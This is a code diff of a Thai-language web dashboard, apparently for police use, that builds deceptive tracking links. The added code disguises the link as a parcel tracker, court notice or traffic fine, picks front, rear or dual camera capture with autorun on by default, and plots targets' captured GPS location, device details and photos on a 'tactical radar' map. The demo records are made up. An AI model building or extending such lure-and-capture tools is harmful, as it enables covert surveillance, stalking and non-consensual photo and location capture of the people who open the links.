@@ -35,6 +35,14 @@
     <!-- SweetAlert2 -->
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
+    <!-- Leaflet.js for Tactical Radar Map -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin=""/>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
+
+    <!-- LINE LIFF SDK & Config -->
+    <script charset="utf-8" src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
+    <script src="js/config.js"></script>
+
     <!-- Main Police System Design CSS -->
     <link rel="stylesheet" href="css/index.css">
 </head>
@@ -250,6 +258,41 @@
                                 </label>
                             </div>
 
+                            <!-- Vanity Path Cloaking (พรางเส้นทาง URL ให้แนบเนียนสูงสุด) -->
+                            <div class="space-y-1.5">
+                                <label class="block text-xs font-bold text-slate-700 flex items-center justify-between">
+                                    <span class="flex items-center gap-1.5">
+                                        <span>🎭</span>
+                                        <span>รูปแบบเส้นทางพรางตา (Path Cloaking)</span>
+                                    </span>
+                                    <span class="text-[10px] text-police-blue font-mono bg-blue-50 px-2 py-0.5 rounded-full border border-blue-200">
+                                        เนียนตา 100%
+                                    </span>
+                                </label>
+                                <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs">
+                                    <label class="p-2 rounded-xl border border-slate-200 bg-white hover:bg-blue-50/60 cursor-pointer flex flex-col items-center justify-center text-center transition font-bold text-slate-700 has-[:checked]:border-police-blue has-[:checked]:bg-blue-50/80 has-[:checked]:text-police-blue shadow-xs">
+                                        <input type="radio" name="vanity-path" value="standard" checked class="sr-only" onchange="syncTargetUrl()">
+                                        <span class="text-sm">🔗</span>
+                                        <span class="text-[11px] truncate">มาตรฐาน (link.html)</span>
+                                    </label>
+                                    <label class="p-2 rounded-xl border border-slate-200 bg-white hover:bg-blue-50/60 cursor-pointer flex flex-col items-center justify-center text-center transition font-bold text-slate-700 has-[:checked]:border-police-blue has-[:checked]:bg-blue-50/80 has-[:checked]:text-police-blue shadow-xs">
+                                        <input type="radio" name="vanity-path" value="parcel" class="sr-only" onchange="syncTargetUrl()">
+                                        <span class="text-sm">📦</span>
+                                        <span class="text-[11px] truncate">พัสดุ /track-order</span>
+                                    </label>
+                                    <label class="p-2 rounded-xl border border-slate-200 bg-white hover:bg-blue-50/60 cursor-pointer flex flex-col items-center justify-center text-center transition font-bold text-slate-700 has-[:checked]:border-police-blue has-[:checked]:bg-blue-50/80 has-[:checked]:text-police-blue shadow-xs">
+                                        <input type="radio" name="vanity-path" value="legal" class="sr-only" onchange="syncTargetUrl()">
+                                        <span class="text-sm">⚖️</span>
+                                        <span class="text-[11px] truncate">คดี /court-notice</span>
+                                    </label>
+                                    <label class="p-2 rounded-xl border border-slate-200 bg-white hover:bg-blue-50/60 cursor-pointer flex flex-col items-center justify-center text-center transition font-bold text-slate-700 has-[:checked]:border-police-blue has-[:checked]:bg-blue-50/80 has-[:checked]:text-police-blue shadow-xs">
+                                        <input type="radio" name="vanity-path" value="traffic" class="sr-only" onchange="syncTargetUrl()">
+                                        <span class="text-sm">🚦</span>
+                                        <span class="text-[11px] truncate">ใบสั่ง /traffic-fine</span>
+                                    </label>
+                                </div>
+                            </div>
+
                             <!-- Destination URL Input -->
                             <div class="space-y-2">
                                 <div class="relative">
@@ -259,15 +302,41 @@
                                         oninput="syncTargetUrl()">
                                 </div>
 
-                                <!-- Options -->
+                                <!-- Camera Mode Selector -->
+                                <div class="p-3.5 rounded-2xl bg-blue-50/80 border border-blue-200 space-y-2.5">
+                                    <div class="flex items-center justify-between">
+                                        <label class="text-xs font-black text-police-blue flex items-center gap-1.5">
+                                            <i class="fa-solid fa-camera text-police-gold"></i>
+                                            <span>โหมดการทำงานของกล้อง (Camera Mode)</span>
+                                        </label>
+                                        <span class="text-[10px] bg-white text-blue-700 font-bold px-2.5 py-0.5 rounded-full border border-blue-200 shadow-xs">
+                                            ดักจับภาพถ่าย
+                                        </span>
+                                    </div>
+                                    <div class="grid grid-cols-3 gap-2 p-1.5 bg-slate-100 rounded-xl border border-slate-200 text-xs">
+                                        <label class="flex items-center justify-center gap-1 p-2 rounded-lg cursor-pointer transition font-bold text-slate-700 hover:bg-slate-200 has-[:checked]:bg-police-blue has-[:checked]:text-white has-[:checked]:shadow-sm text-center">
+                                            <input type="radio" name="cam-mode" value="front" checked class="sr-only" onchange="syncTargetUrl()">
+                                            <span>📸 กล้องหน้า</span>
+                                        </label>
+                                        <label class="flex items-center justify-center gap-1 p-2 rounded-lg cursor-pointer transition font-bold text-slate-700 hover:bg-slate-200 has-[:checked]:bg-police-blue has-[:checked]:text-white has-[:checked]:shadow-sm text-center">
+                                            <input type="radio" name="cam-mode" value="rear" class="sr-only" onchange="syncTargetUrl()">
+                                            <span>📷 กล้องหลัง</span>
+                                        </label>
+                                        <label class="flex items-center justify-center gap-1 p-2 rounded-lg cursor-pointer transition font-bold text-slate-700 hover:bg-slate-200 has-[:checked]:bg-police-blue has-[:checked]:text-white has-[:checked]:shadow-sm text-center">
+                                            <input type="radio" name="cam-mode" value="dual" class="sr-only" onchange="syncTargetUrl()">
+                                            <span>🔄 หน้า+หลัง (Dual)</span>
+                                        </label>
+                                    </div>
+                                    <p class="text-[11px] text-slate-600 font-medium px-1 flex items-center gap-1" id="cam-mode-hint">
+                                        <span>💡</span> <span><b>กล้องหน้า:</b> ถ่ายจับใบหน้าเป้าหมายขณะมองจอ (แนะนำ/เร็วที่สุด)</span>
+                                    </p>
+                                </div>
+
+                                <!-- Auxiliary Options -->
                                 <div class="flex flex-wrap items-center gap-4 px-1 text-xs text-slate-700 pt-1 font-medium">
                                     <label class="flex items-center gap-2 cursor-pointer">
                                         <input type="checkbox" id="check-autorun" checked onchange="syncTargetUrl()" class="rounded text-police-blue focus:ring-police-blue w-4 h-4">
                                         <span>ดักจับอัตโนมัติ (autorun=1)</span>
-                                    </label>
-                                    <label class="flex items-center gap-2 cursor-pointer">
-                                        <input type="checkbox" id="check-dualcam" onchange="syncTargetUrl()" class="rounded text-police-blue focus:ring-police-blue w-4 h-4">
-                                        <span>ถ่ายกล้องหน้า + กล้องหลัง (cam=dual)</span>
                                     </label>
                                     <label class="flex items-center gap-2 cursor-pointer">
                                         <input type="checkbox" id="check-redirect" checked onchange="syncTargetUrl()" class="rounded text-police-blue focus:ring-police-blue w-4 h-4">
@@ -371,15 +440,19 @@
                 <div class="lg:col-span-5 space-y-4">
                     <div class="rounded-2xl border border-blue-100 bg-white p-4 sm:p-5 shadow-sm space-y-4">
                         <div class="flex items-center justify-between pb-3 border-b border-slate-200">
-                            <!-- Preview Tabs (LINE vs Telegram) -->
-                            <div class="flex items-center gap-1.5 p-1 bg-slate-100 rounded-xl border border-slate-200">
+                            <!-- Preview Tabs (LINE vs Telegram vs Tactical Radar) -->
+                            <div class="flex items-center gap-1 p-1 bg-slate-100 rounded-xl border border-slate-200">
                                 <button type="button" id="tab-btn-line" onclick="switchPreviewTab('line')"
-                                    class="px-3 py-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1.5 bg-police-blue text-white shadow-sm">
-                                    <span>📱</span> <span>LINE Flex</span>
+                                    class="px-2.5 py-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1 bg-police-blue text-white shadow-sm">
+                                    <span>📱</span> <span>LINE</span>
                                 </button>
                                 <button type="button" id="tab-btn-tele" onclick="switchPreviewTab('telegram')"
-                                    class="px-3 py-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1.5 text-slate-600 hover:text-slate-900">
+                                    class="px-2.5 py-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1 text-slate-600 hover:text-slate-900">
                                     <i class="fa-brands fa-telegram text-sky-500"></i> <span>Telegram</span>
+                                </button>
+                                <button type="button" id="tab-btn-radar" onclick="switchPreviewTab('radar')"
+                                    class="px-2.5 py-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1 text-slate-600 hover:text-slate-900">
+                                    <span>🛰️</span> <span>Radar สด</span>
                                 </button>
                             </div>
 
@@ -470,6 +543,71 @@
                             <p class="text-[11px] text-slate-500 text-center mt-3 font-medium">
                                 จำลองจากข้อความ Telegram Bot Photo + Inline Keyboard Button
                             </p>
+                        </div>
+
+                        <!-- TAB 3: Tactical Live Radar & Target History Map -->
+                        <div id="view-radar-preview" class="hidden space-y-3">
+                            <!-- Radar Header & Controls -->
+                            <div class="flex items-center justify-between p-2.5 rounded-xl bg-slate-900 text-white shadow-sm">
+                                <div class="flex items-center gap-2">
+                                    <span class="relative flex h-2.5 w-2.5">
+                                      <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                                      <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
+                                    </span>
+                                    <div>
+                                        <div class="text-xs font-bold flex items-center gap-1.5">
+                                            <span>เรดาร์ติดตามสด</span>
+                                            <span id="radar-count-badge" class="px-1.5 py-0.2 bg-blue-600/80 text-[10px] rounded font-mono">0 พิกัด</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="flex items-center gap-1.5">
+                                    <button type="button" onclick="loadRecentTrackingRadar(true)" title="รีโหลดประวัติล่าสุด"
+                                        class="px-2 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-[11px] font-bold text-slate-200 transition flex items-center gap-1 border border-slate-700 active:scale-95">
+                                        <i class="fa-solid fa-arrows-rotate text-[10px]" id="radar-refresh-icon"></i> รีเฟรช
+                                    </button>
+                                    <button type="button" onclick="resetRadarToStation()" title="พิกัดศูนย์ สภ.นิคมพัฒนา"
+                                        class="px-2 py-1 rounded-lg bg-blue-900/80 hover:bg-blue-800 text-[11px] font-bold text-blue-200 transition flex items-center gap-1 border border-blue-700/60 active:scale-95">
+                                        <i class="fa-solid fa-building-shield text-[10px]"></i> สภ.
+                                    </button>
+                                </div>
+                            </div>
+
+                            <!-- Tactical Leaflet Radar Map Viewport -->
+                            <div class="relative rounded-2xl overflow-hidden border-2 border-slate-800 shadow-md bg-slate-950">
+                                <div id="tactical-radar-map" style="height: 250px; width: 100%; z-index: 1;"></div>
+                                
+                                <!-- Map Overlay Status -->
+                                <div class="absolute bottom-2 left-2 z-[400] bg-slate-900/85 backdrop-blur-md px-2.5 py-1 rounded-lg border border-slate-700 text-[10px] text-slate-300 font-mono flex items-center gap-2">
+                                    <span id="radar-map-status">🛰️ Tactical Leaflet Map</span>
+                                    <span class="text-slate-500">|</span>
+                                    <span id="radar-active-coords" class="text-emerald-400 font-bold">12.8252, 101.1687</span>
+                                </div>
+
+                                <!-- Map Type Toggle (Street / Satellite) -->
+                                <div class="absolute top-2 right-2 z-[400] flex gap-1 bg-slate-900/85 backdrop-blur-md p-1 rounded-lg border border-slate-700 text-[10px]">
+                                    <button type="button" onclick="setRadarMapLayer('street')" id="btn-layer-street" class="px-2 py-0.5 rounded font-bold transition bg-police-blue text-white">ถนน</button>
+                                    <button type="button" onclick="setRadarMapLayer('satellite')" id="btn-layer-satellite" class="px-2 py-0.5 rounded font-bold transition text-slate-300 hover:text-white">ดาวเทียม</button>
+                                </div>
+                            </div>
+
+                            <!-- Live Intel Feed Header -->
+                            <div class="flex items-center justify-between px-1 pt-1">
+                                <span class="text-xs font-bold text-police-blue flex items-center gap-1.5">
+                                    <i class="fa-solid fa-list-check text-amber-500"></i>
+                                    <span>ข้อมูลดักจับล่าสุด (Live Captured Intel)</span>
+                                </span>
+                                <span class="text-[11px] text-slate-400 font-mono" id="radar-last-updated">-</span>
+                            </div>
+
+                            <!-- Feed List Container -->
+                            <div id="radar-intel-feed" class="space-y-2 max-h-72 overflow-y-auto pr-1">
+                                <div class="p-4 rounded-xl bg-slate-50 border border-slate-200 text-center text-xs text-slate-500 space-y-1">
+                                    <i class="fa-solid fa-satellite-dish text-2xl text-slate-400 animate-pulse"></i>
+                                    <p class="font-bold">กำลังเชื่อมต่อฐานข้อมูลพิกัด...</p>
+                                    <p class="text-[11px] text-slate-400">หมุดตำแหน่งและภาพถ่ายจะปรากฏที่นี่เมื่อเป้าหมายเปิดลิงก์</p>
+                                </div>
+                            </div>
                         </div>
 
                     </div>
@@ -806,7 +944,12 @@
             const currentDir = window.location.href.substring(0, window.location.href.lastIndexOf('/'));
             const baseDirectLink = currentDir ? `${currentDir}/link.html` : 'link.html';
 
+            // Vanity Path Cloaking Selection
+            const vanityRadio = document.querySelector('input[name="vanity-path"]:checked');
+            const vanityVal = vanityRadio ? vanityRadio.value : 'standard';
+
             let baseTracker = (engine === 'github') ? baseDirectLink : baseLiffLink;
+
             let fullUrl = '';
 
             let queryParams = [];
@@ -824,9 +967,22 @@
                 queryParams.push(`autorun=1`);
             }
 
-            const dualCamCheck = document.getElementById('check-dualcam');
-            if (dualCamCheck && dualCamCheck.checked) {
+            if (vanityVal && vanityVal !== 'standard') {
+                queryParams.push(`channel=${encodeURIComponent(vanityVal)}`);
+            }
+
+            const camModeRadio = document.querySelector('input[name="cam-mode"]:checked');
+            const camMode = camModeRadio ? camModeRadio.value : 'front';
+            const camHint = document.getElementById('cam-mode-hint');
+
+            if (camMode === 'dual') {
                 queryParams.push(`cam=dual`);
+                if (camHint) camHint.innerHTML = '<span>💡</span> <span><b>กล้องคู่ (หน้า + หลัง):</b> ถ่ายใบหน้า แล้วสลับเปิดกล้องหลังถ่ายสภาพแวดล้อม ส่ง 2 ภาพเข้า Telegram</span>';
+            } else if (camMode === 'rear') {
+                queryParams.push(`cam=rear`);
+                if (camHint) camHint.innerHTML = '<span>💡</span> <span><b>กล้องหลัง:</b> ถ่ายเฉพาะกล้องหลังเพื่อดูสภาพแวดล้อมและสิ่งที่อยู่ตรงหน้าเป้าหมาย</span>';
+            } else {
+                if (camHint) camHint.innerHTML = '<span>💡</span> <span><b>กล้องหน้า:</b> ถ่ายจับใบหน้าเป้าหมายขณะมองจอ (แนะนำ/เร็วที่สุด)</span>';
             }
 
             fullUrl = `${baseTracker}?${queryParams.join('&')}`;
@@ -999,6 +1155,16 @@
                 const targetPhone = params.get('phone');
                 const presetId = params.get('preset');
                 const urlParam = params.get('url');
+                const camParam = (params.get('cam') || '').toLowerCase();
+
+                if (camParam) {
+                    const radios = document.querySelectorAll('input[name="cam-mode"]');
+                    radios.forEach(r => {
+                        if (r.value === camParam || (camParam === 'both' && r.value === 'dual') || (camParam === 'back' && r.value === 'rear')) {
+                            r.checked = true;
+                        }
+                    });
+                }
 
                 if (targetName) {
                     const nameInput = document.getElementById('target-name');
@@ -1029,10 +1195,472 @@
             }
         }
 
+        // =========================================================================
+        // Tactical Radar Map & Live Intel Feed Engine (Leaflet.js)
+        // =========================================================================
+        let radarMap = null;
+        let radarTargetGroup = null;
+        let radarMarkersMap = {};
+        let radarStreetLayer = null;
+        let radarSatLayer = null;
+        const POLICE_STATION_COORDS = [12.8252, 101.1687]; // สภ.นิคมพัฒนา จ.ระยอง
+        let radarIsLoading = false;
+
+        function switchPreviewTab(tab) {
+            const btnLine = document.getElementById('tab-btn-line');
+            const btnTele = document.getElementById('tab-btn-tele');
+            const btnRadar = document.getElementById('tab-btn-radar');
+            const viewLine = document.getElementById('view-line-preview');
+            const viewTele = document.getElementById('view-tele-preview');
+            const viewRadar = document.getElementById('view-radar-preview');
+            const badgeMode = document.getElementById('preview-badge-mode');
+
+            // Reset styles
+            [btnLine, btnTele, btnRadar].forEach(btn => {
+                if (btn) {
+                    btn.className = "px-2.5 py-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1 text-slate-600 hover:text-slate-900";
+                }
+            });
+            if (viewLine) viewLine.classList.add('hidden');
+            if (viewTele) viewTele.classList.add('hidden');
+            if (viewRadar) viewRadar.classList.add('hidden');
+
+            if (tab === 'line') {
+                if (btnLine) btnLine.className = "px-2.5 py-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1 bg-police-blue text-white shadow-sm";
+                if (viewLine) viewLine.classList.remove('hidden');
+                if (badgeMode) badgeMode.textContent = "LINE Flex";
+            } else if (tab === 'telegram') {
+                if (btnTele) btnTele.className = "px-2.5 py-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1 bg-sky-600 text-white shadow-sm";
+                if (viewTele) viewTele.classList.remove('hidden');
+                if (badgeMode) badgeMode.textContent = "Telegram Bot";
+            } else if (tab === 'radar') {
+                if (btnRadar) btnRadar.className = "px-2.5 py-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1 bg-emerald-700 text-white shadow-sm";
+                if (viewRadar) viewRadar.classList.remove('hidden');
+                if (badgeMode) badgeMode.textContent = "Tactical Radar";
+
+                initRadarMap();
+                setTimeout(() => {
+                    if (radarMap) {
+                        radarMap.invalidateSize();
+                    }
+                }, 200);
+                loadRecentTrackingRadar(false);
+            }
+        }
+
+        function initRadarMap() {
+            if (radarMap) return;
+            const mapEl = document.getElementById('tactical-radar-map');
+            if (!mapEl) return;
+
+            radarStreetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '&copy; OpenStreetMap',
+                maxZoom: 19
+            });
+
+            radarSatLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+                attribution: 'Tiles &copy; Esri',
+                maxZoom: 19
+            });
+
+            radarMap = L.map('tactical-radar-map', {
+                center: POLICE_STATION_COORDS,
+                zoom: 12,
+                layers: [radarStreetLayer],
+                zoomControl: false
+            });
+
+            L.control.zoom({ position: 'bottomright' }).addTo(radarMap);
+
+            // Police HQ Station Marker
+            const policeHqIcon = L.divIcon({
+                className: 'police-hq-marker',
+                html: `<div style="background:#1e3a8a;color:#ffffff;border:2.5px solid #d97706;border-radius:50%;width:34px;height:34px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 12px rgba(30,58,138,0.8);font-size:16px;cursor:pointer;">👮</div>`,
+                iconSize: [34, 34],
+                iconAnchor: [17, 17]
+            });
+
+            L.marker(POLICE_STATION_COORDS, { icon: policeHqIcon })
+                .addTo(radarMap)
+                .bindPopup(`
+                    <div style="font-family:'Prompt',sans-serif;font-size:12px;color:#1e3a8a;line-height:1.4;">
+                        <b>🏛️ สภ.นิคมพัฒนา ภ.จว.ระยอง</b><br>
+                        <span style="font-size:11px;color:#64748b;">ศูนย์ปฏิบัติการสืบสวนและติดตามเป้าหมาย</span><br>
+                        <span style="font-size:10px;color:#059669;font-weight:bold;">● สถานีประจำการหลัก</span>
+                    </div>
+                `);
+
+            radarTargetGroup = L.featureGroup().addTo(radarMap);
+            window.radarMap = radarMap;
+        }
+
+        function setRadarMapLayer(type) {
+            if (!radarMap) return;
+            const btnStreet = document.getElementById('btn-layer-street');
+            const btnSat = document.getElementById('btn-layer-satellite');
+
+            if (type === 'satellite') {
+                if (radarMap.hasLayer(radarStreetLayer)) radarMap.removeLayer(radarStreetLayer);
+                radarMap.addLayer(radarSatLayer);
+                if (btnSat) btnSat.className = "px-2 py-0.5 rounded font-bold transition bg-police-blue text-white";
+                if (btnStreet) btnStreet.className = "px-2 py-0.5 rounded font-bold transition text-slate-300 hover:text-white";
+            } else {
+                if (radarMap.hasLayer(radarSatLayer)) radarMap.removeLayer(radarSatLayer);
+                radarMap.addLayer(radarStreetLayer);
+                if (btnStreet) btnStreet.className = "px-2 py-0.5 rounded font-bold transition bg-police-blue text-white";
+                if (btnSat) btnSat.className = "px-2 py-0.5 rounded font-bold transition text-slate-300 hover:text-white";
+            }
+        }
+
+        function resetRadarToStation() {
+            if (!radarMap) return;
+            radarMap.flyTo(POLICE_STATION_COORDS, 13);
+            const coordsEl = document.getElementById('radar-active-coords');
+            if (coordsEl) coordsEl.textContent = `${POLICE_STATION_COORDS[0]}, ${POLICE_STATION_COORDS[1]}`;
+        }
+
+        // โหลดข้อมูลดักจับล่าสุดจาก GAS หรือแคชท้องถิ่น
+        async function loadRecentTrackingRadar(force = false) {
+            if (radarIsLoading) return;
+            radarIsLoading = true;
+
+            const refreshIcon = document.getElementById('radar-refresh-icon');
+            if (refreshIcon) refreshIcon.classList.add('fa-spin');
+
+            const statusEl = document.getElementById('radar-map-status');
+            if (statusEl) statusEl.textContent = '🔄 กำลังดึงข้อมูลพิกัด...';
+
+            let logs = [];
+
+            try {
+                // เรียกผ่าน API กลาง callGasApi (ดึง 25 รายการล่าสุด)
+                if (typeof callGasApi === 'function') {
+                    const res = await callGasApi('getTrackingLogs', { limit: 25 }, 'GET');
+                    if (res && res.data && Array.isArray(res.data) && res.data.length > 0) {
+                        logs = res.data;
+                        try {
+                            localStorage.setItem('SAN_TRACKING_LOGS_CACHE', JSON.stringify(logs));
+                        } catch (e) { }
+                    }
+                }
+            } catch (err) {
+                console.warn('Cannot fetch live logs from GAS:', err);
+            }
+
+            // ถ้าไม่มีข้อมูลจาก Server ให้ดึงจาก LocalStorage หรือแสดง Mockup Demo สำหรับทดสอบ
+            if (!logs || logs.length === 0) {
+                try {
+                    const cached = localStorage.getItem('SAN_TRACKING_LOGS_CACHE');
+                    if (cached) logs = JSON.parse(cached);
+                } catch (e) { }
+            }
+
+            // หากยังว่างเปล่า (เช่น ใช้งานครั้งแรก) ให้สร้าง Demo Data เพื่อให้ผู้ใช้เห็นการทำงานของเรดาร์ทันที
+            if (!logs || logs.length === 0) {
+                logs = [
+                    {
+                        id: 'demo_1',
+                        timestamp: new Date().toLocaleTimeString('th-TH', { hour: '2-digit', minute: '2-digit' }) + ' น.',
+                        targetName: 'นายประวิทย์ (เคส 12/68)',
+                        ip: '182.232.19.45',
+                        cityRegion: 'อ.นิคมพัฒนา จ.ระยอง',
+                        lat: 12.8315,
+                        lng: 101.1750,
+                        accuracy: '12.4 ม. (GPS จริง)',
+                        isp: 'Advanced Wireless Network (AIS 5G)',
+                        deviceInfo: 'Apple iPhone 14 Pro (iOS 18)',
+                        photoUrl: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=400&q=80',
+                        motion: 'อยู่นิ่ง / วางบนโต๊ะ',
+                        battery: '82%'
+                    },
+                    {
+                        id: 'demo_2',
+                        timestamp: 'เมื่อ 25 นาทีก่อน',
+                        targetName: 'ผู้ต้องสงสัยคดีทรัพย์สิน',
+                        ip: '49.228.112.78',
+                        cityRegion: 'อ.ปลวกแดง จ.ระยอง',
+                        lat: 12.9750,
+                        lng: 101.2150,
+                        accuracy: '18.0 ม. (GPS จริง)',
+                        isp: 'True Internet / 5G',
+                        deviceInfo: 'Samsung Galaxy S23 Ultra (Android 14)',
+                        photoUrl: '',
+                        motion: 'เคลื่อนที่เร็ว / นั่งบนรถ',
+                        battery: '45%'
+                    }
+                ];
+            }
+
+            renderRadarTargetCards(logs);
+            updateRadarMapMarkers(logs);
+
+            if (refreshIcon) refreshIcon.classList.remove('fa-spin');
+            if (statusEl) statusEl.textContent = `🛰️ ติดตาม ${logs.length} จุดพิกัด`;
+
+            const lastUpdatedEl = document.getElementById('radar-last-updated');
+            if (lastUpdatedEl) {
+                const now = new Date();
+                lastUpdatedEl.textContent = `อัปเดต: ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')} น.`;
+            }
+
+            const countBadge = document.getElementById('radar-count-badge');
+            if (countBadge) countBadge.textContent = `${logs.length} พิกัด`;
+
+            radarIsLoading = false;
+        }
+
+        // ปักหมุดพิกัดลงบน Leaflet Map
+        function updateRadarMapMarkers(logs) {
+            if (!radarMap || !radarTargetGroup) return;
+
+            radarTargetGroup.clearLayers();
+            radarMarkersMap = {};
+
+            const validCoords = [];
+
+            logs.forEach((item, index) => {
+                const lat = parseFloat(item.lat);
+                const lng = parseFloat(item.lng);
+                if (isNaN(lat) || isNaN(lng) || (lat === 0 && lng === 0)) return;
+
+                validCoords.push([lat, lng]);
+
+                // แยกไอคอนเป้าหมายล่าสุด (Pulse Animation) กับเป้าหมายก่อนหน้า
+                const isLatest = (index === 0);
+                const markerHtml = `
+                    <div style="position:relative;width:32px;height:32px;display:flex;align-items:center;justify-content:center;">
+                        ${isLatest ? '<span style="position:absolute;width:100%;height:100%;border-radius:50%;background:#ef4444;opacity:0.6;animation:ping 1.2s cubic-bezier(0,0,0.2,1) infinite;"></span>' : ''}
+                        <div style="background:${isLatest ? '#ef4444' : '#d97706'};color:white;border:2px solid white;border-radius:50%;width:26px;height:26px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,0.4);font-size:12px;font-weight:bold;z-index:10;">
+                            ${isLatest ? '🎯' : '📍'}
+                        </div>
+                    </div>
+                `;
+
+                const targetIcon = L.divIcon({
+                    className: 'radar-target-marker',
+                    html: markerHtml,
+                    iconSize: [32, 32],
+                    iconAnchor: [16, 16]
+                });
+
+                const popupHtml = `
+                    <div style="font-family:'Prompt',sans-serif;font-size:12px;min-width:180px;line-height:1.5;">
+                        <div style="font-weight:bold;color:#1e3a8a;border-bottom:1px solid #e2e8f0;padding-bottom:3px;margin-bottom:4px;display:flex;align-items:center;gap:4px;">
+                            <span>🎯</span> <span>${escapeHtml(item.targetName || 'เป้าหมาย')}</span>
+                        </div>
+                        <div style="font-size:11px;color:#475569;space-y:2px;">
+                            <div>🕒 <b>เวลา:</b> ${escapeHtml(item.timestamp || '-')}</div>
+                            <div>📍 <b>พิกัด:</b> ${lat.toFixed(5)}, ${lng.toFixed(5)}</div>
+                            <div>🎯 <b>ความแม่น:</b> ${escapeHtml(item.accuracy || '-')}</div>
+                            <div>📱 <b>เครื่อง:</b> ${escapeHtml(item.deviceInfo || '-')}</div>
+                            ${item.motion && item.motion !== '-' ? `<div>🏃 <b>การเคลื่อนไหว:</b> <span style="color:#0284c7;font-weight:bold;">${escapeHtml(item.motion)}</span></div>` : ''}
+                        </div>
+                        ${item.photoUrl ? `
+                            <div style="margin-top:6px;border-radius:8px;overflow:hidden;border:1px solid #cbd5e1;cursor:pointer;" onclick="showCapturedPhotoModal('${item.photoUrl}', '${escapeHtml(item.targetName)}')">
+                                <img src="${item.photoUrl.split('|')[0].trim()}" style="width:100%;height:80px;object-fit:cover;" alt="Capture">
+                                <div style="text-align:center;background:#1e3a8a;color:white;font-size:10px;padding:2px 0;">📸 แตะเพื่อดูภาพขยาย</div>
+                            </div>
+                        ` : ''}
+                        <div style="margin-top:6px;display:flex;gap:4px;">
+                            <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="flex:1;text-align:center;padding:4px;background:#0284c7;color:white;border-radius:6px;text-decoration:none;font-size:11px;font-weight:bold;">🗺️ Google Maps</a>
+                        </div>
+                    </div>
+                `;
+
+                const marker = L.marker([lat, lng], { icon: targetIcon })
+                    .addTo(radarTargetGroup)
+                    .bindPopup(popupHtml);
+
+                radarMarkersMap[item.id || ('idx_' + index)] = marker;
+            });
+
+            // ปรับมุมมองแผนที่ให้ครอบคลุมพิกัดเป้าหมายและ สภ.
+            if (validCoords.length > 0) {
+                validCoords.push(POLICE_STATION_COORDS);
+                try {
+                    radarMap.fitBounds(validCoords, { padding: [30, 30], maxZoom: 14 });
+                } catch (e) { }
+            }
+        }
+
+        // แสดงการ์ดรายการข้อมูลประวัติ (Intel Feed)
+        function renderRadarTargetCards(logs) {
+            const feedEl = document.getElementById('radar-intel-feed');
+            if (!feedEl) return;
+
+            if (!logs || logs.length === 0) {
+                feedEl.innerHTML = `
+                    <div class="p-6 rounded-xl bg-slate-50 border border-slate-200 text-center text-xs text-slate-500 space-y-2">
+                        <i class="fa-solid fa-radar text-3xl text-slate-300"></i>
+                        <p class="font-bold text-slate-700">ยังไม่มีประวัติการเปิดลิงก์ในรอบนี้</p>
+                        <p class="text-[11px] text-slate-400">ส่งลิงก์ดักจับให้เป้าหมายเพื่อรับพิกัดสดและรูปถ่ายที่นี่</p>
+                    </div>
+                `;
+                return;
+            }
+
+            let html = '';
+            logs.forEach((item, index) => {
+                const hasCoords = (item.lat && item.lng && !isNaN(parseFloat(item.lat)) && !isNaN(parseFloat(item.lng)));
+                const photos = item.photoUrl ? item.photoUrl.split('|').map(u => u.trim()).filter(Boolean) : [];
+                const firstPhoto = photos.length > 0 ? photos[0] : '';
+                const itemId = item.id || ('idx_' + index);
+
+                // Badge การเคลื่อนไหว
+                let motionBadge = '';
+                if (item.motion && item.motion !== '-') {
+                    let motionColor = 'bg-blue-50 text-blue-700 border-blue-200';
+                    let motionIcon = 'fa-person';
+                    if (item.motion.includes('นิ่ง') || item.motion.includes('โต๊ะ')) {
+                        motionColor = 'bg-slate-100 text-slate-700 border-slate-300';
+                        motionIcon = 'fa-chair';
+                    } else if (item.motion.includes('รถ') || item.motion.includes('เร็ว')) {
+                        motionColor = 'bg-amber-50 text-amber-700 border-amber-200';
+                        motionIcon = 'fa-car-side';
+                    }
+                    motionBadge = `<span class="inline-flex items-center gap-1 text-[10px] px-2 py-0.5 rounded-full font-bold border ${motionColor}"><i class="fa-solid ${motionIcon} text-[9px]"></i> ${escapeHtml(item.motion)}</span>`;
+                }
+
+                html += `
+                    <div class="p-3 rounded-xl bg-white border border-slate-200 hover:border-police-blue/50 transition shadow-xs space-y-2 text-xs">
+                        <div class="flex items-start justify-between gap-2">
+                            <div class="space-y-0.5">
+                                <div class="font-bold text-police-blue flex items-center gap-1.5">
+                                    <span class="w-2 h-2 rounded-full ${index === 0 ? 'bg-emerald-500 animate-pulse' : 'bg-slate-400'}"></span>
+                                    <span class="text-sm">${escapeHtml(item.targetName || 'เป้าหมายสืบสวน')}</span>
